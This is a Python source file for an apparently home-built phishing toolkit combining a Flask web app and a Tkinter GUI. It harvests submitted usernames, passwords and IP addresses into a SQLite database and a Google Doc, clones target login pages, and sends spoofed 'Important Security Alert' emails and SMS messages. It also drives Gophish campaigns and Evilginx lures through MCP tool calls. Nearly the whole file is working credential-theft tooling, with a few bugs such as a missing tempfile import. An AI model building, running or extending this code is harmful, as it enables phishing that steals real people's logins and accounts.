import os
import requests
from flask import Flask, render_template, redirect, request, session, jsonify, send_from_directory
from flask_session import Session
from bs4 import BeautifulSoup
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from twilio.rest import Client
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
import sqlite3
import threading
import asyncio
import tkinter as tk
from tkinter import ttk, Label, Entry, Button, Toplevel, Text, Scrollbar, messagebox
from modelcontextprotocol.sdk.client import use_mcp_tool
import sys
sys.path.append(os.path.abspath('.'))

app = Flask(__name__)
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

screenshot_dir = tempfile.mkdtemp()

SCOPES = ['https://www.googleapis.com/auth/drive']
SERVICE_ACCOUNT_FILE = '/Users/tpdph/Documents/Google_AI_API_Key.txt' # Replace with the path to your service account key file
DATABASE_FILE = 'phishing_data.db'

def create_google_doc(credentials, content):
    try:
        service = build('drive', 'v3', credentials=credentials)
        file_metadata = {
            'name': 'Phishing Data',
            'mimeType': 'application/vnd.google-apps.document'
        }
        file = service.files().create(body=file_metadata, fields='id').execute()
        doc_id = file.get('id')

        doc_service = build('docs', 'v1', credentials=credentials)
        requests = [
            {
                'insertText': {
                    'location': {
                        'index': 1,
                    },
                    'text': content
                }
            }
        ]
        doc_service.documents().batchUpdate(documentId=doc_id, body={'requests': requests}).execute()
        return f"Document created successfully with ID: {doc_id}"
    except HttpError as error:
        return f"An error occurred: {error}"

def get_google_credentials():
    creds = None
    creds = service_account.Credentials.from_service_account_file(
        SERVICE_ACCOUNT_FILE, scopes=SCOPES)
    return creds

def create_database():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            ip_address TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def store_credentials(username, password, ip_address):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO credentials (username, password, ip_address)
        VALUES (?, ?, ?)
    ''', (username, password, ip_address))
    conn.commit()
    conn.close()

def get_credentials_from_db():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM credentials")
    rows = cursor.fetchall()
    conn.close()
    return rows

def setup_phisher_routes():
    @app.route('/screenshots')
    def list_screenshots():
        screenshots = [f for f in os.listdir(screenshot_dir) if f.startswith('screenshot_')]
        return render_template('screenshots.html', screenshots=screenshots)

    @app.route('/screenshots/<filename>')
    def get_screenshot(filename):
        return send_from_directory(screenshot_dir, filename)

    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method == 'POST':
            username = request.form['username']
            password = request.form['password']
            ip_address = request.remote_addr
            session['username'] = username
            session['password'] = password
            session['ip_address'] = ip_address
            
            create_database()
            store_credentials(username, password, ip_address)

            creds = get_google_credentials()
            if creds:
                content = f"Username: {username}\nPassword: {password}\nIP Address: {ip_address}"
                doc_result = create_google_doc(creds, content)
                print(doc_result)
            
            
            return jsonify({'message': 'Credentials received successfully'})
        else:
            return render_template('index.html')

    @app.route('/credentials', methods=['GET'])
    def get_credentials():
        if 'username' in session and 'password' in session and 'ip_address' in session:
            return jsonify({'username': session['username'], 'password': session['password'], 'ip_address': session['ip_address']})
        else:
            return jsonify({'message': 'No credentials found'})

    @app.route('/campaigns')
    def list_campaigns():
        return "List of campaigns"

    @app.route('/campaigns/new', methods=['GET', 'POST'])
    async def new_campaign():
        if request.method == 'POST':
            name = request.form['name']
            target_url = request.form['target_url']
            
            try:
                result = await use_mcp_tool({
                    "server_name": 'gophish',
                    "tool_name": 'create_campaign',
                    "arguments": {
                        "name": name,
                        "target_url": target_url
                    }
                })
                return f"Gophish campaign created: {result.content[0].text}"
            except Exception as error:
                return f"Error creating Gophish campaign: {error}"
        else:
            return render_template('new_campaign.html')

    
    @app.route('/settings')
    def settings():
        return "Settings page"

    @app.route('/clone', methods=['GET', 'POST'])
    def clone_page():
        if request.method == 'POST':
            url = request.form['url']
            try:
                response = requests.get(url)
                soup = BeautifulSoup(response.content, 'html.parser')
                return render_template('cloned_page.html', content=str(soup))
            except Exception as e:
                return f"Error cloning page: {e}"
        else:
            return render_template('clone.html')

    @app.route('/email_template', methods=['GET', 'POST'])
    def email_template():
        if request.method == 'POST':
            email_content = request.form['email_content']
            sender_email = request.form['sender_email']
            recipient_email = request.form['recipient_email']
            return render_template('email_preview.html', content=email_content, sender_email=sender_email, recipient_email=recipient_email)
        else:
            return render_template('email_template.html')

    @app.route('/send_email', methods=['POST'])
    def send_email():
        sender_email = request.form['sender_email']
        recipient_email = request.form['recipient_email']
        email_content = request.form['email_content']
        
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = recipient_email
        message['Subject'] = 'Important Security Alert'  # You can customize the subject

        message.attach(MIMEText(email_content, 'plain'))

        try:
            with smtplib.SMTP('localhost') as server:
                server.send_message(message)
            return "Email sent successfully"
        except Exception as e:
            return f"Error sending email: {e}"

    @app.route('/sms_template', methods=['GET', 'POST'])
    def sms_template():
        if request.method == 'POST':
            sender_phone = request.form['sender_phone']
            recipient_phone = request.form['recipient_phone']
            sms_content = request.form['sms_content']
            return render_template('sms_preview.html', sender_phone=sender_phone, recipient_phone=recipient_phone, sms_content=sms_content)
        else:
            return render_template('sms_template.html')

    @app.route('/send_sms', methods=['POST'])
    def send_sms():
        account_sid = "ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Replace with your Twilio Account SID
        auth_token = "your_auth_token"  # Replace with your Twilio Auth Token
        client = Client(account_sid, auth_token)

        sender_phone = request.form['sender_phone']
        recipient_phone = request.form['recipient_phone']
        sms_content = request.form['sms_content']

        try:
            message = client.messages.create(
                from_=sender_phone,
                body=sms_content,
                to=recipient_phone
            )
            return f"SMS sent successfully with SID: {message.sid}"
        except Exception as e:
            return f"Error sending SMS: {e}"

    @app.route('/view_credentials')
    def view_credentials():
        credentials = get_credentials_from_db()
        return render_template('view_credentials.html', credentials=credentials)

    @app.route('/performance')
    def performance_panel():
        credentials = get_credentials_from_db()
        num_credentials = len(credentials)
        return render_template('performance.html', num_credentials=num_credentials)

    @app.route('/evilginx', methods=['GET', 'POST'])
    async def evilginx_page():
        if request.method == 'POST':
            hostname = request.form['hostname']
            phish_url = request.form['phish_url']
            redirect_url = request.form['redirect_url']
            
            try:
                result = await use_mcp_tool({
                    "server_name": 'evilginx',
                    "tool_name": 'create_lure',
                    "arguments": {
                        "hostname": hostname,
                        "phish_url": phish_url,
                        "redirect_url": redirect_url
                    }
                })
                return f"Evilginx lure created: {result.content[0].text}"
            except Exception as error:
                return f"Error creating Evilginx lure: {error}"
        else:
            return render_template('evilginx.html')

def setup_phisher_gui(phisher_tab):
    def create_new_campaign_window(phisher_tab):
        campaign_window = Toplevel(phisher_tab)
        campaign_window.title("New Campaign")

        Label(campaign_window, text="Campaign Name:").grid(row=0, column=0, sticky="e")
        name_entry = Entry(campaign_window)
        name_entry.grid(row=0, column=1)

        Label(campaign_window, text="Target URL:").grid(row=1, column=0, sticky="e")
        target_url_entry = Entry(campaign_window)
        target_url_entry.grid(row=1, column=1)

        create_button = Button(campaign_window, text="Create Campaign", command=lambda: create_campaign(name_entry, target_url_entry, campaign_window))
        create_button.grid(row=2, column=1, pady=10)

    async def create_campaign(name_entry, target_url_entry, campaign_window):
        name = name_entry.get()
        target_url = target_url_entry.get()
        try:
            result = await use_mcp_tool({
                "server_name": 'gophish',
                "tool_name": 'create_campaign',
                "arguments": {
                    "name": name,
                    "target_url": target_url
                }
            })
            messagebox.showinfo("Success", f"Gophish campaign created: {result.content[0].text}")
        except Exception as error:
            messagebox.showerror("Error", f"Error creating Gophish campaign: {error}")
        campaign_window.destroy()

    def create_clone_page_window(phisher_tab):
        clone_window = Toplevel(phisher_tab)
        clone_window.title("Clone Page")

        Label(clone_window, text="URL to Clone:").grid(row=0, column=0, sticky="e")
        url_entry = Entry(clone_window)
        url_entry.grid(row=0, column=1)

        clone_button = Button(clone_window, text="Clone Page", command=lambda: clone_page(url_entry, clone_window))
        clone_button.grid(row=1, column=1, pady=10)

    def clone_page(url_entry, clone_window):
        url = url_entry.get()
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            cloned_page = str(soup)
            
            text_area = Text(clone_window, wrap="word", height=20, width=80)
            text_area.insert("1.0", cloned_page)
            text_area.config(state="disabled")
            text_area.pack(pady=10, padx=10)
        except Exception as e:
            messagebox.showerror("Error", f"Error cloning page: {e}")

    def create_email_template_window(phisher_tab):
        email_window = Toplevel(phisher_tab)
        email_window.title("Email Template")

        Label(email_window, text="Sender Email:").grid(row=0, column=0, sticky="e")
        sender_email_entry = Entry(email_window)
        sender_email_entry.grid(row=0, column=1)

        Label(email_window, text="Recipient Email:").grid(row=1, column=0, sticky="e")
        recipient_email_entry = Entry(email_window)
        recipient_email_entry.grid(row=1, column=1)

        Label(email_window, text="Email Content:").grid(row=2, column=0, sticky="e")
        email_content_entry = Text(email_window, height=10, width=50)
        email_content_entry.grid(row=2, column=1)

        preview_button = Button(email_window, text="Preview Email", command=lambda: preview_email(sender_email_entry, recipient_email_entry, email_content_entry, email_window))
        preview_button.grid(row=3, column=0, pady=10)
        
        send_button = Button(email_window, text="Send Email", command=lambda: send_email_gui(sender_email_entry, recipient_email_entry, email_content_entry, email_window))
        send_button.grid(row=3, column=1, pady=10)

    def preview_email(sender_email_entry, recipient_email_entry, email_content_entry, email_window):
        sender_email = sender_email_entry.get()
        recipient_email = recipient_email_entry.get()
        email_content = email_content_entry.get("1.0", "end")
        
        preview_window = Toplevel(email_window)
        preview_window.title("Email Preview")
        
        Label(preview_window, text=f"Sender: {sender_email}").pack()
        Label(preview_window, text=f"Recipient: {recipient_email}").pack()
        text_area = Text(preview_window, wrap="word", height=10, width=50)
        text_area.insert("1.0", email_content)
        text_area.config(state="disabled")
        text_area.pack()

    def send_email_gui(sender_email_entry, recipient_email_entry, email_content_entry, email_window):
        sender_email = sender_email_entry.get()
        recipient_email = recipient_email_entry.get()
        email_content = email_content_entry.get("1.0", "end")
        
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = recipient_email
        message['Subject'] = 'Important Security Alert'  # You can customize the subject

        message.attach(MIMEText(email_content, 'plain'))

        try:
            with smtplib.SMTP('localhost') as server:
                server.send_message(message)
            messagebox.showinfo("Success", "Email sent successfully")
        except Exception as e:
            messagebox.showerror("Error", f"Error sending email: {e}")

    def create_sms_template_window(phisher_tab):
        sms_window = Toplevel(phisher_tab)
        sms_window.title("SMS Template")

        Label(sms_window, text="Sender Phone:").grid(row=0, column=0, sticky="e")
        sender_phone_entry = Entry(sms_window)
        sender_phone_entry.grid(row=0, column=1)

        Label(sms_window, text="Recipient Phone:").grid(row=1, column=0, sticky="e")
        recipient_phone_entry = Entry(sms_window)
        recipient_phone_entry.grid(row=1, column=1)

        Label(sms_window, text="SMS Content:").grid(row=2, column=0, sticky="e")
        sms_content_entry = Text(sms_window, height=10, width=50)
        sms_content_entry.grid(row=2, column=1)

        preview_button = Button(sms_window, text="Preview SMS", command=lambda: preview_sms(sender_phone_entry, recipient_phone_entry, sms_content_entry, sms_window))
        preview_button.grid(row=3, column=0, pady=10)
        
        send_button = Button(sms_window, text="Send SMS", command=lambda: send_sms_gui(sender_phone_entry, recipient_phone_entry, sms_content_entry, sms_window))
        send_button.grid(row=3, column=1, pady=10)

    def preview_sms(sender_phone_entry, recipient_phone_entry, sms_content_entry, sms_window):
        sender_phone = sender_phone_entry.get()
        recipient_phone = recipient_phone_entry.get()
        sms_content = sms_content_entry.get("1.0", "end")
        
        preview_window = Toplevel(sms_window)
        preview_window.title("SMS Preview")
        
        Label(preview_window, text=f"Sender: {sender_phone}").pack()
        Label(preview_window, text=f"Recipient: {recipient_phone}").pack()
        text_area = Text(preview_window, wrap="word", height=10, width=50)
        text_area.insert("1.0", sms_content)
        text_area.config(state="disabled")
        text_area.pack()

    def send_sms_gui(sender_phone_entry, recipient_phone_entry, sms_content_entry, sms_window):
        account_sid = "ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Replace with your Twilio Account SID
        auth_token = "your_auth_token"  # Replace with your Twilio Auth Token
        client = Client(account_sid, auth_token)

        sender_phone = sender_phone_entry.get()
        recipient_phone = recipient_phone_entry.get()
        sms_content = sms_content_entry.get("1.0", "end")

        try:
            message = client.messages.create(
                from_=sender_phone,
                body=sms_content,
                to=recipient_phone
            )
            messagebox.showinfo("Success", f"SMS sent successfully with SID: {message.sid}")
        except Exception as e:
            messagebox.showerror("Error", f"Error sending SMS: {e}")

    def create_evilginx_page_window(phisher_tab):
        evilginx_window = Toplevel(phisher_tab)
        evilginx_window.title("Evilginx Lure")

        Label(evilginx_window, text="Hostname:").grid(row=0, column=0, sticky="e")
        hostname_entry = Entry(evilginx_window)
        hostname_entry.grid(row=0, column=1)

        Label(evilginx_window, text="Phish URL:").grid(row=1, column=0, sticky="e")
        phish_url_entry = Entry(evilginx_window)
        phish_url_entry.grid(row=1, column=1)

        Label(evilginx_window, text="Redirect URL:").grid(row=2, column=0, sticky="e")
        redirect_url_entry = Entry(evilginx_window)
        redirect_url_entry.grid(row=2, column=1)

        create_button = Button(evilginx_window, text="Create Lure", command=lambda: create_lure(hostname_entry, phish_url_entry, redirect_url_entry, evilginx_window))
        create_button.grid(row=3, column=1, pady=10)

    async def create_lure(hostname_entry, phish_url_entry, redirect_url_entry, evilginx_window):
        hostname = hostname_entry.get()
        phish_url = phish_url_entry.get()
        redirect_url = redirect_url_entry.get()
        try:
            result = await use_mcp_tool({
                "server_name": 'evilginx',
                "tool_name": 'create_lure',
                "arguments": {
                    "hostname": hostname,
                    "phish_url": phish_url,
                    "redirect_url": redirect_url
                }
            })
            messagebox.showinfo("Success", f"Evilginx lure created: {result.content[0].text}")
        except Exception as error:
            messagebox.showerror("Error", f"Error creating Evilginx lure: {error}")
        evilginx_window.destroy()

    new_campaign_button = ttk.Button(phisher_tab, text="New Campaign", command=create_new_campaign_window)
    new_campaign_button.pack(pady=5, padx=5)
    new_campaign_button.bind("<Enter>", lambda e: new_campaign_button.config(text="Create a new phishing campaign"))
    new_campaign_button.bind("<Leave>", lambda e: new_campaign_button.config(text="New Campaign"))

    clone_page_button = ttk.Button(phisher_tab, text="Clone Page", command=create_clone_page_window)
    clone_page_button.pack(pady=5, padx=5)
    clone_page_button.bind("<Enter>", lambda e: clone_page_button.config(text="Clone a webpage"))
    clone_page_button.bind("<Leave>", lambda e: clone_page_button.config(text="Clone Page"))

    email_template_button = ttk.Button(phisher_tab, text="Email Template", command=create_email_template_window)
    email_template_button.pack(pady=5, padx=5)
    email_template_button.bind("<Enter>", lambda e: email_template_button.config(text="Create and send a phishing email"))
    email_template_button.bind("<Leave>", lambda e: email_template_button.config(text="Email Template"))

    sms_template_button = ttk.Button(phisher_tab, text="SMS Template", command=create_sms_template_window)
    sms_template_button.pack(pady=5, padx=5)
    sms_template_button.bind("<Enter>", lambda e: sms_template_button.config(text="Create and send a phishing SMS"))
    sms_template_button.bind("<Leave>", lambda e: sms_template_button.config(text="SMS Template"))

    evilginx_button = ttk.Button(phisher_tab, text="Evilginx Lure", command=create_evilginx_page_window)
    evilginx_button.pack(pady=5, padx=5)
    evilginx_button.bind("<Enter>", lambda e: evilginx_button.config(text="Create an Evilginx lure"))
    evilginx_button.bind("<Leave>", lambda e: evilginx_button.config(text="Evilginx Lure"))

    setup_phisher_routes()
